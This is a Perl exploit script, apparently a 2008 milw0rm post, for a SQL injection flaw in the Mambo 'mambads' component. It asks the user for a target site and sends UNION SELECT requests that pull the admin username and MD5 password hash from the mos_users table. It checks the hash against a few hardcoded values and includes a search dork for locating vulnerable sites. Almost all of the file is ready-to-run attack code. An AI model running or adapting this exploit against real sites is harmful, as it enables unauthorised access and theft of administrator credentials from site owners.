#!/usr/bin/perl -w

#   Mambo Component mambads  1.0 RC1 Beta & 1.0 RC1 Remote SQL Injection #
########################################
#[*] Found by : Houssamix From H-T Team 
#[*] H-T Team [ HouSSaMix + ToXiC350 ] from MoroCCo
#[*] Greetz : Stack & CoNaN & HaCkeR_EgY & room-hacker & Hak3r-b0y & All friends & All muslims HaCkeRs  :) 
#[*] Script_Name: "Mambo"
#[*] Component_Name: mambads  1.0 RC1 Beta & 1.0 RC1
#[*] Dork: index.php?option=com_mambads


system("color f");
print "\t\t########################################################\n\n";
print "\t\t#                        Viva Islam                    #\n\n";
print "\t\t########################################################\n\n";
print "\t\t# Mambo Component mambads  Remote SQL Injection		  #\n\n";
print "\t\t# H-T Team [HouSSaMiX - ToXiC350]	            	  #\n\n";
print "\t\t########################################################\n\n";

use LWP::UserAgent;

print "\nEnter your Target (http://site.com/mambo/): ";
	chomp(my $target=<STDIN>);

$uname="username";
$passwd="password";
$magic="mos_users";
$pass1="imambo";
$pass2="aspen";
$pass3="ligio";
$pass4="qwally";

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $target . "/index.php?option=com_mambads&Itemid=45&func=view&ma_cat=99999%20union%20select%20concat(CHAR(60,117,115,101,114,62),".$uname.",CHAR(60,117,115,101,114,62))from/**/".$magic."/**";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;

print "\n[+] The Target : ".$target."";

if ($answer =~ /<user>(.*?)<user>/){
       
		print "\n[+] Admin User : $1";
}
$host2 = $target . "/index.php?option=com_mambads&Itemid=45&func=view&ma_cat=99999%20union%20select%20".$passwd."/**/from/**/".$magic."/**";
$res2 = $b->request(HTTP::Request->new(GET=>$host2));
$answer = $res2->content;
if ($answer =~/([0-9a-fA-F]{32})/){
		print "\n[+] Admin Hash : $1\n\n";
		print "#   Exploit succeed!  #\n\n";
}
else{print "\n[-] Exploit Failed...\n";
}
if ($answer =~/697d54f398600b7ff10860a4422a6ea3/){print "[+] md5 cracked :".$pass4."\n\n";}
if ($answer =~/53138ba09b49380fea0aa99bb9ab511d/){print "[+] md5 cracked :".$pass3."\n\n";}
if ($answer =~/68e3d2564cb5858e2b69f1f49dfe40a3/){print "[+] md5 cracked :".$pass1."\n\n";}
if ($answer =~/91a343c02e6c4e10b023216ecfcd69e7/){print "[+] md5 cracked :".$pass2."\n\n";}

# codec  by Houssamix From H-T Team
# special thx to : StaCk 

# milw0rm.com [2008-05-29]
